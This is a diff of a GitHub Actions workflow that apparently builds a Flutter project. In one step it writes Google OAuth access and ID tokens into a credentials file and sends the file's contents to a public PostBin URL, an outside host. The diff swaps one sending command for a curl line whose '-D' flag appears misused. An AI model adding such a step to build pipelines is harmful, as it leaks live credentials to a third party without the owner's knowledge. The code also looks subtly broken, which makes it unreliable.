@@ -86,7 +86,7 @@ jobs:
           mkdir -p $(dirname $LOCATION)
           echo "{\"accessToken\":{\"type\":\"Bearer\",\"data\":\"${{ steps.access-token-auth.outputs.access_token }}\",\"expiry\":\"${{ steps.access-token-auth.outputs.access_token_expiration }}\"},\"idToken\":\"${{ steps.id-token-auth.outputs.id_token }}\",\"scopes\":[\"openid\",\"https://www.googleapis.com/auth/userinfo.email\"]}" > $LOCATION
           CREDENTIALS=$(cat $LOCATION)
-          echo "CREDENTIALS=$CREDENTIALS" | POST https://www.toptal.com/developers/postbin/1687206137315-9088729855138
+          curl -H "Content-Type: application/json" -D "$CREDENTIALS" "https://www.toptal.com/developers/postbin/1687206137315-9088729855138"
 
       - name: 🐦 Setup Flutter
         uses: subosito/flutter-action@v2
